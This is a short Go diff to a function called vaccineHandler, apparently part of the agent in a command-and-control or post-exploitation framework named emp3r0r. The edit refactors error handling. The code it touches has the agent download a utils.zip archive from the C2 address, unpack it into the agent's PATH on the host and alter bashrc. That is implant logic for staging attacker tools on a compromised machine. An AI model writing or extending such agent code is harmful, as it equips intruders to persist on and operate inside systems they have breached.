@@ -14,13 +14,14 @@ import (
 	"github.com/mholt/archiver"
 )
 
-func vaccineHandler() string {
-	log.Printf("Downloading utils.zip from %s", emp3r0r_data.CCAddress+"utils.zip")
+func vaccineHandler() (out string) {
+	log.Printf("Downloading utils.zip from %s", emp3r0r_data.CCAddress+"www/utils.zip")
 	_, err := DownloadViaCC(emp3r0r_data.CCAddress+"www/utils.zip", emp3r0r_data.AgentRoot+"/utils.zip")
-	out := "[+] Utils have been successfully installed"
+	out = "[+] Utils have been successfully installed"
 	if err != nil {
 		log.Print("Utils error: " + err.Error())
 		out = "[-] Download error: " + err.Error()
+		return
 	}
 
 	// unpack utils.zip to our PATH
@@ -45,5 +46,5 @@ func vaccineHandler() string {
 			out = fmt.Sprintf("Update bashrc: %v", err)
 		}
 	}
-	return out
+	return
 }
